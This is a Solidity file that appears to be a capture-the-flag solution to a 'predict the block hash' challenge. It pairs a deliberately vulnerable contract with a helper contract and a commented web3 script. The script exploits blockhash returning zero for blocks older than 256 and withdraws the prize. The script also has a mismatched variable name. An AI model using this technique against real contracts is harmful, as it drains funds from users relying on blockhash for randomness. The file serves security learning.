pragma solidity ^0.4.21;

import './OtherContract.sol';

/*
const oneEth = web3.utils.toWei('1', 'ether');
var predictTheBlockHashChallenge = await PredictTheBlockHashChallenge.deployed();
var predictHashHelper = await PredictHashHelper.deployed();

var blockNumTarget = await web3.eth.getBlockNumber() + 260;
var answer = await predictHashHelper.getAnswer(blockNumTarget);
await predictHashHelper.lockInGuess(answer, {from: accounts[0], value: oneEth});
var blockNumCurrent = await web3.eth.getBlockNumber();
while (blockNumCurrent < blockNumberTarget) {
    await predictHashHelper.wasteBlock();
    blockNumCurrent = await web3.eth.getBlockNumber();
}
await predictTheBlockHashChallenge.settle();
await predictTheBlockHashChallenge.isComplete();

var testArray = new Uint8Array(100);
var promises = testArray.map(x => predictHashHelper.wasteBlock());
await Promise.all(promises);
*/

contract PredictHashHelper is OtherContract {
    uint8 waste;
    uint256 settlementBlockNumber;

    function getSettlementBlockNumber() public view returns (uint256) {
        return settlementBlockNumber;
    }

    function getAnswer(uint256 blockNum) public view returns (bytes32) {
        return block.blockhash(blockNum);
    }

    function wasteBlock() public returns (uint256) {
        waste += 1;
        return block.number;
    }

    function() public payable { 
    }

    function isComplete() public view returns (bool) {
        require(otherContract != 0);
        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);
        return predictTheBlockHashChallenge.isComplete();
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function lockInGuess(bytes32 hash) public payable {
        require(otherContract != 0);
        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);
        predictTheBlockHashChallenge.lockInGuess.value(1 ether)(hash);
        settlementBlockNumber = block.number;
    }    

    function settle() public {
        require(otherContract != 0);
        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);
        predictTheBlockHashChallenge.settle();
        require(predictTheBlockHashChallenge.isComplete() == true);
        withdraw();
        settlementBlockNumber = 0;
    }
}

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
